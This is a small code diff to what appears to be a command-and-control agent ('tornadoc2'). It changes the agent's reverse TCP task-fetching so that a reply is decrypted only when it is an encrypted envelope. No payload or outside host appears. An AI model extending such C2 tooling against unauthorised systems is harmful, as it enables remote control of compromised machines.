@@ -13,6 +13,7 @@ import (
 	"sync"
 	"time"
 
+	"tornadoc2/agent/crypto"
 	"tornadoc2/agent/features"
 	"tornadoc2/agent/internal/pivot"
 	"tornadoc2/agent/protocol"
@@ -348,7 +349,7 @@ func (t *tcpRevTransport) FetchTasks(wire *WireSession) ([]Task, error) {
 	}
 	body := []byte(reply.Body)
 
-	if wire != nil {
+	if wire != nil && crypto.IsEnvelope(body) {
 		plain, wasEnc, derr := wire.DecryptResponse(body)
 		if derr != nil {
 			return nil, fmt.Errorf(
